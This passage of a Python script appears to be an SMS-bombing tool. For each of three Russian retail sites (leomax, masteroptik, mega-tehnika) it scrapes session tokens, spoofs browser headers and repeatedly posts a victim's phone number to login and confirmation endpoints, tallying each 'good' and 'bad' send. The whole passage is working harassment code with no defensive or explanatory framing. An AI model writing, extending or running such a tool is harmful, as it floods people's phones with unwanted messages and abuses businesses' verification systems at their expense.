						'Origin': 'https://auth.k8s.leomax.ru',
						'Referer': 'https://auth.k8s.leomax.ru/',
						'Sec-Fetch-Mode': 'cors',
						'Sec-Fetch-Site': 'same-site',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				json = {"phone":phone_plus}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("leomax " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://masteroptik.ru/",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Connection': 'keep-alive',
						'Host': 'masteroptik.ru',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'none',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					}
			)
			bxajaxid = re.search('name="bxajaxid" id="bxajaxid_(.+?)_8BACKi"', response.text).group(1)
			response = session.post("https://masteroptik.ru/",
				headers = {
						'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
						'Accept-Encoding': 'gzip, deflate, br',
						'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'Cache-Control': 'max-age=0',
						'Connection': 'keep-alive',
						'Host': 'masteroptik.ru',
						'Origin': 'https://masteroptik.ru',
						'Referer': 'https://masteroptik.ru/',
						'Sec-Fetch-Mode': 'navigate',
						'Sec-Fetch-Site': 'same-origin',
						'Sec-Fetch-User': '?1',
						'Upgrade-Insecure-Requests': '1',
						'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
					},
				data = {
					"bxajaxid" : (None, bxajaxid),
					"AJAX_CALL" : (None, "Y"),
					"ajax_opt_add" : (None, "popup"),
					"REQUEST" : (None, "get"),
					"PHONE" : (None, phone2),
					"STEP" : (None, "confirm"),
					"TYPE" : (None, "get"),
					"BLOCK" : (None, "login")
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("masteroptik " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0
	for _ in range(config.count):
		try:
			session = requests.Session()
			response = session.get("https://mega-tehnika.ru/",
				headers = {
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
					'accept-encoding': 'gzip, deflate, br',
					'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
					'cache-control': 'max-age=0',
					'referer': 'https://mega-tehnika.ru/',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-user': '?1',
					'upgrade-insecure-requests': '1',
					'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'
				}
			)
			csrf = re.search('name="csrf-token" content="(.+?)"', response.text).group(1)
			response = session.post("https://mega-tehnika.ru/",
				headers = {
						'accept': 'application/json, text/javascript, */*; q=0.01',
						'accept-encoding': 'gzip, deflate, br',
						'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
						'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
						'origin': 'https://mega-tehnika.ru',
						'referer': 'https://mega-tehnika.ru/',
						'sec-fetch-mode': 'cors',
						'sec-fetch-site': 'same-origin',
						'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84',
						'x-csrf-token': csrf,
						'x-requested-with': 'XMLHttpRequest'
					},
				data = {
					"action": "ap",
					"num": phone1
				}
			)
			good += 1
			goods += 1
		except Exception as err:
			print(err)
			bad += 1
			bads += 1
	print("mega_tehnika " + str(good) + "/" + str(config.count))
	good = 0
	bad = 0

	print('\nTotal goods:', goods, 'Total bads:', bads)

send()
